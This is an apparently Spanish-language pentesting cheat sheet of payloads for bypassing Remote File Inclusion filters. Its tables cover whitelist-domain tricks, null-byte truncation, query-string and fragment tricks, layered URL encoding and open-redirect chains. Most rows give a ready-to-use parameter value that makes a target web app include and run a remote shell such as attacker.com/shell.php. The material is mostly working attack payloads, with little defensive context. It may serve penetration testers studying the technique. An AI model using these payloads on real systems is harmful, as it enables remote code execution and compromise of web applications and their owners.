---
aliases:
  - RFI Bypass
  - Whitelist Bypass RFI
  - Null Byte RFI
tags:
  - type/cheatsheet
  - vuln/rfi
  - technique/defense-evasion
  - asset/web-app
primary categories: null
secondary categories: null
tertiary categories: null
type: CheatSheet
linked:
  - '[[Remote File Inclusion (RFI)]]'
---
# RFI - Bypass de Filtros

***

## Whitelist Domain Bypass

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| Subdomain prefix | `?page=http://target.com.attacker.com/shell.php` | Suffix bypass. |
| Subdomain on attacker domain | `?page=http://attacker.com/target.com/shell.php` | Path traversal en directory. |
| Substring match | `?page=http://attacker-target.com/shell.php` | Composed domain. |
| Whitelist endsWith | `?page=http://attacker.com/target.com.html` | If suffix-checked. |
| Whitelist startsWith | `?page=http://target.com.attacker.com` | Prefix bypass. |
| Whitelist contains | `?page=http://attacker.com/?inc=target.com` | Substring anywhere. |
| Subdomain takeover combo | Atacante claims dangling subdomain → hosts payload | Combine. |
| Userinfo trick | `?page=http://target.com@attacker.com/shell.php` | URL parser confusion. |
| `@` separator | Backend parses target.com as user, host = attacker.com | Standard. |
| Path-based whitelist | `?page=http://target.com/redirect?url=http://attacker.com/shell.php` | Open Redirect chain. |
| Wildcard whitelist | `*.target.com` registered subdomain por atacante | Subdomain abuse. |
| URL parser quirks | Per-PHP version | Edge. |
| Combine con DNS rebinding | Resolves target first, then attacker | TOCTOU. |
| Encoded variants | URL-encoded chars | Multi-layer. |
| Fragment trick | `?page=http://attacker.com/#@target.com` | Fragment ignored. |
^rfi-bypass-whitelist

___

## Null Byte Truncation

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| Concept | App appends extension (e.g. `.php`). Null byte truncates string en C-style PHP. | Pre-PHP 5.3.4. |
| Standard | `?page=http://attacker.com/shell.php%00` | URL-encoded NUL. |
| Doble encoded | `?page=http://attacker.com/shell.php%2500` | If decoded twice. |
| Hex byte | `?page=http://attacker.com/shell.php\x00` | Literal NUL. |
| Combine con extension | Backend appends `.html` → atacante's `.php%00.html` truncates | Standard. |
| PHP < 5.3.4 vulnerable | Modern PHP rejected | Legacy. |
| Combine con `data://` | data:// con NUL byte | Edge. |
| Backend logic specific | Some apps tolerate vs reject | Per-app. |
| Java NUL byte similar | Adjacent (Java pre-old versions) | Edge. |
| Safe en modern stacks | Mostly mitigated | Defense baseline. |
| Combine con MIME type confusion | Edge | Per-app. |
^rfi-bypass-nullbyte

___

## Query String Trick (`?page=...?`)

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| Concept | App appends `.php` to URL. Atacante's URL ends con `?` → backend's `.php` becomes part of query string, not path | Standard bypass. |
| Standard | `?page=http://attacker.com/shell.php?` | App: `http://attacker.com/shell.php?.php`. |
| With param | `?page=http://attacker.com/shell.php?ext=` | Customize. |
| With fragment | `?page=http://attacker.com/shell.php#` | Fragment ignored server-side typically. |
| Multiple `?` | `?page=http://attacker.com/shell.php??` | Edge. |
| Combine con `&` | `?page=http://attacker.com/shell.php?ext=.php` | Same idea. |
| URL encoded `?` | `%3F` | Some encodings. |
| Server config dependent | App may decode/process differently | Per-app. |
| If backend uses URL parser | Strip query before include | Defense. |
| Combine con `.txt` extension serve | Atacante serves shell.php as `.txt` MIME but PHP interpreted | Edge. |
^rfi-bypass-query

___

## URL Encoding

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| Standard URL-encode | `?page=http%3A%2F%2Fattacker.com%2Fshell.php` | Bypass keyword filter. |
| Doble URL-encode | `?page=http%253A%252F%252Fattacker.com%252Fshell.php` | Multi-decode. |
| Triple-encoded | `?page=http%25253A%25252F...` | Edge. |
| URL-encode `://` | `http%3A%2F%2F` | Standard. |
| URL-encode protocol | `%68%74%74%70://` | Per-char. |
| Mixed case hex | `%2F` vs `%2f` | Case bypass. |
| Unicode normalization | Lookalike chars (full-width) | NFKC bypass. |
| HTML entity | `&#104;ttp://...` | If decoded en HTML context. |
| Decimal entity | `&#x68;ttp://...` | Same. |
| Punycode | `xn--...` IDN | Visual confusion. |
| Encoding combinations | URL + HTML + base64 | Multi-layer. |
| Combine con WAF bypass | If WAF only checks raw | Standard. |
| URL parser inconsistency | Different layers parse differently | Edge. |
^rfi-bypass-encoding

___

## Open Redirect Chain

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| Concept | Find Open Redirect on target → use as legit-looking URL → redirect a atacante's payload | Whitelist bypass. |
| Stage 1 | Find Open Redirect on target | See `Open Redirect`. |
| Stage 2 | URL: `https://target.com/redirect?url=http://attacker.com/shell.php` | Atacante's URL goes through target. |
| Stage 3 | Whitelist sees target.com → allowed. | Bypass. |
| Stage 4 | Backend follows redirect → fetches atacante's payload | Indirect inclusion. |
| Combine con HTTP redirect (3xx) | Atacante's server redirects | Same. |
| Combine con meta refresh | HTML-level redirect | Edge — may not follow. |
| Combine con JS redirect | Backend probably won't execute JS | Edge. |
| Combine con DNS rebinding | TOCTOU during fetch | Race. |
| Path traversal en allowed URI | `?page=https://target.com/redirect/../../path/shell.php` | Combine. |
| Subdomain whitelist | `*.target.com` allowed → atacante claims | SDT combo. |
| Cloud storage en target's domain | Upload payload to S3 with target.com CNAME | Edge. |
| Combine con CDN proxy | Use target's CDN as proxy | Edge. |
^rfi-bypass-open-redirect

***
